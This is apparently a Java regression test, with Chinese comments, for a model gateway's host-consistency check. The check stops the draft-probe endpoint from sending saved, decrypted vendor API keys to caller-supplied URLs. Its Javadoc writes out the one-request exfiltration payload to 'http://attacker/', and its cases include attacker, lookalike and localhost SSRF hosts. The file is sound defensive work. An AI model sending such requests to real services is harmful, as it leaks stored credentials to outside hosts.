package com.pab.ficc.ibp.modelgate.server.controller;

/**
 * 草稿探测复用已保存密钥的主机一致性校验（main 方式，不引 JUnit）。
 *
 * <p><b>守的是一条 Critical 缺陷</b>：{@code POST /modelgate/models/test} 的草稿分支
 * 只要求 body 里 {@code upstreamUrl} 非空就成立，而 {@code credential == null} 时
 * {@code requiresSavedCredential()} 返回 true，于是服务端会加载库中<b>解密后</b>的
 * 上游厂商密钥、写进请求头、POST 到<b>调用方指定的地址</b>，上游响应还回显给调用方。
 *
 * <p>一次请求就能把密钥送走：
 * <pre>
 * POST /modelgate/models/test?modelId=&lt;任一已存在模型&gt;
 * {"upstreamUrl":"http://attacker/"}
 * </pre>
 *
 * <p>它绕开了 {@code ModelVO} 上"secretKey 属机密，任何情况下都不下发"那道防线，
 * 而且**与网络隔离无关**——管理员误操作或一次 CSRF 同样能触发，
 * 所以不能靠"管理面本来就该被内网鉴权层收口"来免除。
 *
 * <p>校验规则只比**主机**：改协议、改端口、改接口路径都是正常的配置修正，
 * 拦下来只会挡住真实用途；外传必须把密钥送到另一台主机。一律 fail-closed。
 */
public class DraftProbeCredentialGuardTest {

    private static int pass;
    private static int fail;

    public static void main(String[] args) {
        blocksTheExfiltrationPayload();
        allowsLegitimateEdits();
        failsClosedOnMissingOrMalformed();
        hostIsCaseInsensitive();

        System.out.println();
        System.out.println("通过 " + pass + " / " + (pass + fail));
        if (fail > 0) {
            System.exit(1);
        }
    }

    /** 攻击构造本身：库里是厂商地址，草稿换成攻击者地址 → 必须判不一致。 */
    private static void blocksTheExfiltrationPayload() {
        check("厂商地址 → 攻击者地址：拒绝",
                !ModelController.sameUpstreamHost("https://api.deepseek.com", "http://attacker/"));
        check("内网地址 → 外网收包机：拒绝",
                !ModelController.sameUpstreamHost("http://qwen.internal:8080", "http://1.2.3.4:8888/"));
        check("换成 IP 直连（同厂商名但不同主机）：拒绝",
                !ModelController.sameUpstreamHost("https://api.openai.com", "https://api.openai.com.evil.cn"));
        check("换成 localhost 探内网（SSRF）：拒绝",
                !ModelController.sameUpstreamHost("https://api.openai.com", "http://127.0.0.1:10811"));
    }

    /**
     * 正常改配置不能被误伤——否则运维会被逼着每次改地址都重填一遍密钥，
     * 这种"安全措施"最后一定会被绕过或回滚。
     */
    private static void allowsLegitimateEdits() {
        check("同地址：放行",
                ModelController.sameUpstreamHost("https://api.deepseek.com", "https://api.deepseek.com"));
        check("http → https（厂商升级）：放行",
                ModelController.sameUpstreamHost("http://qwen.internal:8080", "https://qwen.internal:8080"));
        check("改端口（同主机）：放行",
                ModelController.sameUpstreamHost("http://qwen.internal:8080", "http://qwen.internal:8443"));
        check("改接口路径：放行",
                ModelController.sameUpstreamHost("https://api.openai.com", "https://api.openai.com/v1/chat/completions"));
        check("加末尾斜杠：放行",
                ModelController.sameUpstreamHost("https://api.openai.com", "https://api.openai.com/"));
    }

    /**
     * 取不出主机一律当"不一致"。
     *
     * <p>方向必须是 fail-closed：拿不准时宁可让人重填一次密钥，
     * 也不能"解析失败就当它一致"然后把密钥发出去。
     */
    private static void failsClosedOnMissingOrMalformed() {
        check("库中地址为 null：拒绝", !ModelController.sameUpstreamHost(null, "http://a.com"));
        check("库中地址为空串：拒绝", !ModelController.sameUpstreamHost("", "http://a.com"));
        check("草稿地址为 null：拒绝", !ModelController.sameUpstreamHost("http://a.com", null));
        check("草稿地址非法：拒绝", !ModelController.sameUpstreamHost("http://a.com", "not a url"));
        check("两边都非法：拒绝", !ModelController.sameUpstreamHost("???", "???"));
        check("草稿只有路径没有主机：拒绝", !ModelController.sameUpstreamHost("http://a.com", "/v1/chat"));
        check("hostOf 对非法输入返回 null，不抛异常", ModelController.hostOf("h ttp://%%%") == null);
    }

    /** 主机名大小写不敏感，别让 API.OpenAI.com 被判成另一台机器。 */
    private static void hostIsCaseInsensitive() {
        check("大小写不同：放行",
                ModelController.sameUpstreamHost("https://API.OpenAI.COM", "https://api.openai.com"));
        check("hostOf 归一化为小写", "api.openai.com".equals(ModelController.hostOf("https://API.OpenAI.COM/v1")));
    }

    private static void check(String name, boolean ok) {
        if (ok) {
            pass++;
            System.out.println("  PASS  " + name);
        } else {
            fail++;
            System.err.println("  FAIL  " + name);
        }
    }
}
